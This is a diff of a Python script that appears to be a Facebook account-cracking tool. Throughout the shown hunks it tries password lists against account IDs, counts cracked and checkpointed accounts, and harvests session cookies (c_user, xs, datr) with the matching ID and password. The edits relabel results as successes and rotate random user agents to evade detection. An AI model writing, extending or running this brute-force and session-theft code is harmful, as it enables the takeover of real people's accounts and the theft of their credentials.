@@ -954,7 +954,7 @@ def fankygraphv1(idf, pwv, url):
             elif "session_key" in post.text and "EAA" in post.text:
                 ok += 1
                 kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
-                tree = Tree(Panel.fit(f"""{H2}  AKUN OK{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                 tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
@@ -984,10 +984,10 @@ def fankywww(idf, pwv):
     rr = random.randint
     rc = random.choice
     ses = requests.Session()
-    prog.update(des, description=f" {K2}•{H2} NYOBA DULU {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.update(des, description=f" {K2}•{H2} NYOBA DULU {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
-    ua = "Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
-    # ua = random.choice(ugen)
+    # ua = "Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
+    ua = random.choice(ugen)
     for pw in pwv:
         try:
             if 'ya' in ualuh: 
@@ -1044,7 +1044,7 @@ def fankywww(idf, pwv):
                 ok += 1
                 coki = ses.cookies.get_dict()
                 kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
-                tree = Tree(Panel.fit(f"""{H2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                 tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
@@ -1089,7 +1089,7 @@ def fankygraphv2(idf, pwv,url):
 				break
 			elif "session_key" in po.text:
 				ok += 1
-				tree = Tree(Panel.fit(f"""{H2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
 				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
 				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
